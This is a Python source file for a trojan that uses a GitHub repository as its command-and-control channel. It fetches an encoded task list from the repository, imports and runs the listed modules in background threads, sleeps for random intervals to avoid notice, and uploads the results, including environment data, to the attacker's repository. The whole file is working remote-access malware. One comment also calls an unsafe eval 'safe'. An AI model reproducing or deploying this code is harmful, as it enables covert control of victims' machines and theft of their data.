import github3
import base64
import sys
import json
import threading
import time
import random
import os


from datetime import datetime  
from modules.gitconnect import github_connect, get_file_contents


class Trojan:
    def __init__(self, id):
        """
        Initialize the Trojan class with an ID, configuration file, and repository connection.
        """
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()


    def get_config(self):
        """
        Retrieve the configuration file from the GitHub repository and decode it.
        """
        try:
            config_json = get_file_contents('config', self.config_file, self.repo)
            config = json.loads(base64.b64decode(config_json).decode('utf-8'))
        except Exception as e:
            print(f"[ERROR] Failed to load configuration: {e}")
            config = []

        for task in config:
            if task['module'] not in sys.modules:
                try:
                    exec(f"import {task['module']}")
                except Exception as e:
                    print(f"[ERROR] Failed to import module {task['module']}: {e}")
        return config


    def module_runner(self, module):
        """
        Run a module and store its result in the repository.
        """
        try:
            if module not in sys.modules:
                raise ImportError(f"Module {module} is not loaded.")
            result = sys.modules[module].run()
            self.store_module_result(result)
        except ImportError as e:
            print(f"[ERROR] Failed to import module {module}: {e}")
        except Exception as e:
            print(f"[ERROR] Failed to run module {module}: {e}")



    def store_module_result(self, data):
        """
        Store the result of a module run in the repository in a readable format.
        """
        try:
            message = datetime.now().isoformat()
            remote_path = os.path.join('data', self.id, f'{message}.data')

            # Format environment-like data
            if isinstance(data, dict) or hasattr(data, 'keys'):
                # Convert dictionary to JSON for better readability
                result_data = json.dumps({key: str(value) for key, value in data.items()}, indent=4)
            elif isinstance(data, str) and data.startswith("environ"):
                # Parse 'environ' format and split it into readable lines
                environ_data = eval(data.replace("environ", ""))  # Safely evaluate the dictionary-like content
                result_data = json.dumps(environ_data, indent=4)
            else:
                # Handle other data types
                result_data = str(data)

            # Convert to bytes for GitHub API
            result_bytes = result_data.encode('utf-8')

            # Create the file in the GitHub repository
            self.repo.create_file(remote_path, message, result_bytes)
            print(f"[INFO] Result stored in {remote_path}")
        except Exception as e:
            print(f"[ERROR] Failed to store result: {e}")


    def run(self):
        """
        Main loop to repeatedly fetch and execute tasks based on the configuration.
        """
        while True:
            try:
                config = self.get_config()
                for task in config:
                    thread = threading.Thread(
                        target=self.module_runner,
                        args=(task['module'],)
                    )
                    thread.start()
                    time.sleep(random.randint(1, 10))
                time.sleep(random.randint(30 * 60, 3 * 60 * 60))
            except KeyboardInterrupt:
                print("[INFO] Trojan terminated by user.")
                break
            except Exception as e:
                print(f"[ERROR] An unexpected error occurred: {e}")
